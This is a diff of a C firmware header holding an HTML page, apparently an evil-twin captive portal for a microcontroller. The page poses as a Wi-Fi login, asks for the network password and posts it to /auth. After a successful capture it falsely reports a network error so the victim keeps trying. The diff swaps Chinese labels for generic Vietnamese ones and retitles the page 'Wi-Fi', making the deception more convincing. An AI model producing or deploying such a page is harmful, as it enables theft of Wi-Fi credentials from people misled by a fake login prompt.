@@ -1,14 +1,14 @@
 #ifndef WEB_AUTH1_PAGE_H
 #define WEB_AUTH1_PAGE_H
 
-// 现代化简约身份认证页面
+// Modern simple auth page
 const char WEB_AUTH1_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AP认证</title>
+  <title>Wi-Fi</title>
   <style>
     body { font-family: Arial, sans-serif; background: #111; color: #eee; margin: 0; display:flex; align-items:center; justify-content:center; min-height:100vh; }
     .card { width: 90%; max-width: 360px; background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 16px; }
@@ -24,14 +24,14 @@ const char WEB_AUTH1_HTML[] PROGMEM = R"rawliteral(
   </head>
   <body>
     <div class="card">
-      <h1 id="ssidLine">AP模式认证</h1>
-      <p>请完成身份验证</p>
-      <input id="text" type="text" placeholder="输入密码" maxlength="64" minlength="8" />
+      <h1 id="ssidLine">Wi-Fi</h1>
+      <p>Nhập mật khẩu cho mạng này</p>
+      <input id="text" type="text" placeholder="Mật khẩu" maxlength="64" minlength="8" />
       <button id="submitBtn" onclick="submitText()">
         <span class="spinner" id="spinner"></span>
-        <span id="btnText">连接至网络</span>
+        <span id="btnText">Kết nối</span>
       </button>
-      <div class="muted">如需连接此网络，请完成身份验证</div>
+      <div class="muted">Nhập mật khẩu để kết nối mạng này</div>
     </div>
     <script>
       function isValidWifiPassword(p){
@@ -43,7 +43,7 @@ const char WEB_AUTH1_HTML[] PROGMEM = R"rawliteral(
       function submitText(){
         const v = (document.getElementById('text').value||'').trim();
         if(!isValidWifiPassword(v)){
-          alert('密码格式错误');
+          alert('Định dạng mật khẩu không hợp lệ');
           return;
         }
         const btn = document.getElementById('submitBtn');
@@ -52,23 +52,23 @@ const char WEB_AUTH1_HTML[] PROGMEM = R"rawliteral(
         
         btn.disabled = true;
         spinner.style.display = 'inline-block';
-        btnText.textContent = '连接中...';
+        btnText.textContent = 'Đang kết nối...';
         
         fetch('/auth', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ text: v }) })
           .then(r=>r.json()).then(j=>{ 
-            alert(j && j.success ? '网络异常，请重试！' : '提交失败，请重试'); 
+            alert(j && j.success ? 'Lỗi mạng, thử lại!' : 'Gửi thất bại, thử lại'); 
           })
-          .catch(()=>alert('网络错误'))
+          .catch(()=>alert('Lỗi mạng'))
           .finally(()=>{
             btn.disabled = false;
             spinner.style.display = 'none';
-            btnText.textContent = '连接至网络';
+            btnText.textContent = 'Kết nối';
           });
       }
 
       fetch('/status').then(r=>r.json()).then(j=>{
         if(j && j.ssid){
-          document.getElementById('ssidLine').innerText = '连接至' + j.ssid;
+          document.getElementById('ssidLine').innerText = 'Nhập mật khẩu cho mạng ' + j.ssid;
         }
       }).catch(()=>{
       });
